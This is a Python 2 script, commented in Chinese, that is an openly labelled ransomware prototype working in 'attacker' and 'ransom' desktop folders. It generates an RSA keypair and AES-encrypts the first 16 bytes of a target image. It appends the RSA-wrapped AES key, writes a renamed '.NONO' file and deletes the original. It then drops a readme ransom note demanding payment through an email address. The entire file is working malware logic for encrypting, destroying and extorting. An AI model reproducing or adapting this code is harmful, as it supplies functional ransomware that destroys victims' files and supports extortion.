#coding: utf8
import sys
import string
import random
import base64
import os
import codecs
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from binascii import b2a_hex, a2b_hex

class prpcrypt():
    def __init__(self, key):
        self.key = key
        self.mode = AES.MODE_CBC
     
    #加密函数，如果text不是16的倍数【加密文本text必须为16的倍数！】，那就补足为16的倍数
    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.key)
        #这里密钥key 长度必须为16（AES-128）、24（AES-192）、或32（AES-256）Bytes 长度.目前AES-128足够用
        length = 16
        count = len(text)
        if(count % length != 0) :
            add = length - (count % length)
        else:
            add = 0
        text = text + ('\0' * add)
        self.ciphertext = cryptor.encrypt(text)
        #因为AES加密时候得到的字符串不一定是ascii字符集的，输出到终端或者保存时候可能存在问题
        #所以这里统一把加密后的字符串转化为16进制字符串
        return b2a_hex(self.ciphertext)
        #return self.ciphertext
    #解密后，去掉补足的空格用strip() 去掉
    #
    #
if __name__ == '__main__':
    #生成公私钥
    rsa=RSA.generate(1024)
    private_pem = rsa.exportKey()
    with open('C:\Users\\fandashen\Desktop\\attacker\master-private.pem', 'w') as f:
        f.write(private_pem)
    public_pem = rsa.publickey().exportKey()
    with open('C:\Users\\fandashen\Desktop\\ransom\\attack\master-public.pem', 'w') as f:
        f.write(public_pem)
    #生成16位对称密钥
    field=string.letters+string.digits
    Dkey=''.join(random.sample(field,16))
    #读取目标文件并加密前16个字节
    f1=open('C:\Users\\fandashen\Desktop\\ransom\\attack\\1548138662943.png','rb')
    all = f1.read()
    t1=all[0:16]
    t2=all[16:]
    key=prpcrypt(Dkey)
    entxt = key.encrypt(t1)
    f1.close()
    #对对称密钥进行非对称加密
    rsakey = RSA.importKey(public_pem)
    cipher = Cipher_pkcs1_v1_5.new(rsakey)
    cipher_text = base64.b64encode(cipher.encrypt(Dkey))
    # print cipher_text
    # print len(cipher_text)
    #将加密后的内容和加密后的对称密钥及未加密的内容写入新的文件
    with open('C:\Users\\fandashen\Desktop\\ransom\\attack\\1548138662943_en.NONO','wb') as f:
        f.write(entxt+cipher_text+t2)
    #删除原文件
    if(os.path.exists('C:\Users\\fandashen\Desktop\\ransom\\attack\\1548138662943.png')):
        os.remove('C:\Users\\fandashen\Desktop\\ransom\\attack\\1548138662943.png')
    #联系途径
    with codecs.open('C:\Users\\fandashen\Desktop\\ransom\\attack\\readme.txt','w','utf-8') as f:
        f.write(u'你的文件已经被我加密了，请联系我的邮箱abc@123.com，支付相应费用来获取解密途径！')
    